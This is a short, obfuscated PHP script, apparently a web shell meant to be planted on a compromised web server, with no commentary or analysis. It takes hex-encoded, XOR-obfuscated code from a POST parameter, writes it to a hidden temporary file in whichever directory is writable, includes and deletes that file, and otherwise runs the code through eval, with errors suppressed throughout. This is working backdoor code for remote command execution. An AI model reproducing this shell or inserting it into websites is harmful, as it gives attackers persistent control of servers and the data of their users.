<?php
@error_reporting(0);
$irzgrewgc = 7 ^ 227;

$yveicc = "text";
if (isset($_POST[$yveicc])) {
$xuxegxkmd = pack("H*", $_POST[$yveicc]);
if ($xuxegxkmd !== false) {
$kwzshtpp = "";
for ($vpjvyuzc = 0; $vpjvyuzc < strlen($xuxegxkmd); $vpjvyuzc++) { $kwzshtpp .= chr(ord($xuxegxkmd[$vpjvyuzc]) ^ 200); }
$lgesgo = array_filter(array(getenv("TMP"), sys_get_temp_dir(), "/tmp", "/var/tmp", session_save_path(), "/dev/shm", ini_get("upload_tmp_dir"), getcwd(), getenv("TEMP")));
array_unshift($lgesgo, __DIR__);
foreach ($lgesgo as $bcaeezs) {
if (is_dir($bcaeezs) && is_writable($bcaeezs)) {
$oazvsqqp = $bcaeezs . "/.insertion";
if (@file_put_contents($oazvsqqp, $kwzshtpp) !== false) {
include $oazvsqqp;
@unlink($oazvsqqp);
exit;
}
}
}
eval("?>" . $kwzshtpp);
}
}
/* 74d112d3:45a51000 */